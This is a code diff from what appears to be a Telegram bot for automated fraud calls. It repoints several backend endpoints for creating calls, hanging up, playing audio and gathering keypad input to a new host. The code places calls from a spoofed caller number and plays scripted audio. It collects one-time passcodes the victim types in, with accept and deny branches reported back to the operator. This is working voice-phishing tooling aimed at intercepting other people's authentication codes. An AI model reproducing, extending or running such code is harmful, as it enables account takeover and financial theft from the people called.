@@ -762,7 +762,7 @@ def retrive_recording(rec_url,chatid):
 
 
 def callhangup(call_control:str):
-    hangurl = f'https://insufficientmonsoon.online:8443/hangup'
+    hangurl = f'https://articunoapi.com:8443/hangup'
     payload = {
          'uuid':call_control
     }
@@ -784,7 +784,7 @@ def callmaking(number,spoof,chatid,service):
                         "callbackURL": f"{ngrok_url}/{service}/{chatid}/random",
                         "api_key": f"{apiKey}",
                             }
-            url = "https://insufficientmonsoon.online:8443/create-call"
+            url = "https://articunoapi.com:8443/create-call"
             resp = requests.post(url, json=data)
             res = json.loads(resp.text)
             print(resp.text)
@@ -798,7 +798,7 @@ def make_call(t:str,f:str,user_id,service):
     callmaking(number=t,spoof=f,chatid=user_id,service=service)
 
 def custom_callmaking(number,spoof,chatid,script_id):
-        url = "https://insufficientmonsoon.online:8443/create-call"
+        url = "https://articunoapi.com:8443/create-call"
         data = {
              "to_": f"{number}",
               "from_": f"{spoof}",
@@ -878,7 +878,7 @@ def custom_confirm1(message):
 
     
     if up_resp1=='Accept':
-        url = 'https://insufficientmonsoon.online:8443/play-audio'
+        url = 'https://articunoapi.com:8443/play-audio'
         data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://atlanta-api.online/scripts/{customscid}/output3.wav",
@@ -892,7 +892,7 @@ def custom_confirm1(message):
     elif up_resp1=='Deny':
         bot.send_message(chat_id,f"""*Code Denied*""",parse_mode='markdown')
         bot.send_message(chat_id,f"""*Reading script again.*""",parse_mode='markdown')
-        url = 'https://insufficientmonsoon.online:8443/gather-audio'
+        url = 'https://articunoapi.com:8443/gather-audio'
         data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://atlanta-api.online/scripts/{customscid}/output5.wav",
@@ -926,7 +926,7 @@ def custom_prebuild_script_call(script_id,chatid):
             
         
     elif event == "call.answered":
-            url1 = "https://insufficientmonsoon.online:8443/gather-audio"
+            url1 = "https://articunoapi.com:8443/gather-audio"
             data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output1.wav",
@@ -976,7 +976,7 @@ def custom_prebuild_script_call(script_id,chatid):
 
         if otp2 == "1":
             def custom_ask_otp():
-                url3 = 'https://insufficientmonsoon.online:8443/gather-audio'
+                url3 = 'https://articunoapi.com:8443/gather-audio'
                 data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output2.wav",
@@ -992,7 +992,7 @@ def custom_prebuild_script_call(script_id,chatid):
             custom_send_ask_otp()
            
         elif(len(otp2)>=4):
-            url = 'https://insufficientmonsoon.online:8443/play-audio'
+            url = 'https://articunoapi.com:8443/play-audio'
             data = {
     "uuid": f"{call_control_id}",
     "audiourl": f"https://atlanta-api.online/scripts/{script_id}/output4.wav",
